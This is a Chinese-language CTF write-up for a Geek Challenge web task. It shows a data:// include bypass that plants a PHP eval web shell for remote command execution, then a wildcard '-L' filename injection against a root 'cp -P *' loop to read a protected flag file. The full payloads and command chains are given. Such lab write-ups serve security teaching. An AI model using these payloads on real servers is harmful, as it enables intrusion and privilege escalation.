# 极客大挑战（SYC）· 术之尽头

## 一、题目信息

- 类型：Web
- 入口：`/`
- 关键路径：`/robots.txt`、`/flllaaag.php`、`/truueechallenge.php`
- 目标：读 `/tmp/flag`

## 二、信息收集

首页是四张图和一段“术之尽头”的介绍，源码里没有明显接口。

访问：

```text
/robots.txt
```

返回的不是普通文本，而是一段 HTML，里面引用了：

```html
<script src="/assets/robots.min.js"></script>
```

同时有一行：

```text
Disallow: /flllaaag.php
```

`/flllaaag.php` 返回 403：

```text
此路不通
炁行至此，像是被什么东西挡住了。
```

这是诱饵，不是入口。

## 三、robots.min.js

`robots.min.js` 里有一串数字和一个 XOR 操作，大致是：

```js
const k = 17, a = [62, 101, 99, ...];
console.log(a.map(x => String.fromCharCode(x ^ k)).join(""))
```

在控制台运行后得到：

```text
/truueechallenge.php
```

所以真正的入口是：

```text
/truueechallenge.php
```

## 四、include 检查

`/truueechallenge.php` 关键代码：

```php
$cmd = trim(<<<'PHP'
<?php @eval($_POST['cmd']); ?>
PHP);

if (!isset($_GET['file'])) {
    highlight_file(__FILE__);
    exit("Please include your file.");
}

$file = str_replace(' ', '+', $_GET['file']);

if (base64_decode(substr($file, 25), true) !== $cmd) {
    die("blocked");
}

include $file;
```

两个点：

1. `substr($file, 25)`：从第 26 个字符开始截；
2. `base64_decode(..., true)`：严格 Base64 解码；
3. 解码结果必须等于 `$cmd`；
4. 最后 `include $file` 执行。

`$cmd` 是：

```php
<?php @eval($_POST['cmd']); ?>
```

注意 `;` 和 `?>` 之间有一个空格，base64 必须完全对应。

## 五、data:// 绕过

前缀：

```text
data://text/plain;base64,
```

正好 25 个字符。

后面接 base64：

```text
PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7ID8+
```

所以：

```text
file = data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7ID8+
```

URL 编码：

```text
data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7ID8%2B
```

坑：

- `;` 不编码会被当成参数分隔符，`file` 被截断 → `blocked`；
- 末尾 `+` 用 `%2B` 更稳；源码虽然会把空格 `str_replace` 回 `+`，但不要依赖；
- `base64_decode` 是严格模式，多空格/换行都会失败；
- `include data://` 需要 `allow_url_include=On`。

完整请求：

```http
GET /truueechallenge.php?file=data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7ID8%2B
POST cmd=system('id');
```

## 六、RCE 后看 /start.sh

拿到 www-data 的 RCE 后：

```php
system('cat /start.sh');
```

关键内容：

```bash
printf '%s\n' "$FLAG" > /tmp/flag
chown root:root /tmp/flag
chmod 700 /tmp/flag

mkdir -p /var/www/html/primary /var/www/html/marstream
chown root:root /var/www/html/primary /var/www/html/marstream
chmod 777 /var/www/html/primary
chmod 755 /var/www/html/marstream

(
  cd /var/www/html/primary
  while :; do
      cp -P * /var/www/html/marstream/
      chmod 755 -R /var/www/html/marstream/
      sleep 5s
  done
) &
```

权限：

```text
/tmp/flag                  root:root 700
/var/www/html/primary      root:root 777
/var/www/html/marstream    root:root 755
```

- flag 在 `/tmp/flag`，www-data 读不了；
- `primary` 是 777，www-data 可写；
- `marstream` 是 755，root 写、www-data 读；
- root 每 5 秒执行一次 `cp -P *` + `chmod 755 -R`。

## 七、第一次尝试：符号链接

```bash
ln -s /tmp/flag /var/www/html/primary/x
sleep 7
cat /tmp/flag
```

结果：

```text
/tmp/flag                 还是 700
marstream/x -> /tmp/flag  还是符号链接
cat /tmp/flag             Permission denied
```

`chmod -R` 没有跟随 `x` 去改 `/tmp/flag`，所以失败。

## 八、成功路径：`-L` 参数注入

在 `primary` 里放：

```bash
ln -s /tmp/flag z
touch ./-L
```

下一轮 root 执行：

```bash
cp -P *
```

`*` 展开成：

```text
-L z
```

命令变成：

```bash
cp -P -L z /var/www/html/marstream/
```

- `-P`：不跟随符号链接；
- `-L`：跟随符号链接；
- `-L` 在 `-P` 后面，覆盖 `-P`。

所以 root 会：

1. 打开 `z`；
2. 跟随到 `/tmp/flag`；
3. 以 root 权限读取；
4. 写成普通文件 `marstream/z`；
5. 再 `chmod 755`，www-data 可读。

## 九、完整 payload

```php
system('cd /var/www/html/primary;ln -sf /tmp/flag z;touch ./-L;sleep 7;cat /var/www/html/marstream/z');
```

逐段：

| 片段 | 作用 |
|---|---|
| `cd /var/www/html/primary` | 进入 777 目录 |
| `ln -sf /tmp/flag z` | 创建 `z -> /tmp/flag` |
| `touch ./-L` | 创建文件名 `-L`，给 `cp` 当选项 |
| `sleep 7` | 等 root 下一轮（5 秒 + 开销） |
| `cat /var/www/html/marstream/z` | 读 root 复制出来的 flag 副本 |

`touch ./-L` 不能写 `touch -L`，否则 `touch` 会把 `-L` 当选项，不创建文件。

## 十、为什么是 `-L z` 这个顺序

`primary` 里：

```text
-L
z
```

shell 展开 `*` 按字典序，`-` 排在 `z` 前面，所以是：

```text
-L z
```

root 实际执行：

```bash
cp -P -L z /var/www/html/marstream/
```

`-L` 是文件名，但 `cp` 看到它以 `-` 开头，就当成选项。

## 十一、常见的坑

| 坑 | 现象 | 解决 |
|---|---|---|
| `;` 没编码 | `blocked` | 用 `%3B` |
| `+` 没编码 | Base64 错位 | 用 `%2B` |
| 前缀不是 25 位 | `blocked` | 用 `data://text/plain;base64,` |
| `data://text/plain;base64,,` 多逗号 | `blocked` | 只留一个逗号 |
| 只发 GET | 空白 | POST `cmd` |
| `allow_url_include=Off` | include 失败 | 确认配置 |
| `touch -L` | 没创建文件 | `touch ./-L` |
| 直接 `cat /tmp/flag` | Permission denied | 读 `marstream/z` |
| `z` 已存在 | `ln` 报错 | `ln -sf` 或换名字 |
| `-L` 没生效 | `marstream/z` 还是链接 | 试 `--dereference` |

## 十二、一句话

```text
robots.min.js XOR -> /truueechallenge.php
data://text/plain;base64, 过 substr(25)
POST cmd 拿 RCE
root 循环 cp -P * + chmod
文件名 -L 覆盖 -P
root 读取 /tmp/flag，写到 marstream/z
```

flag 未记录。
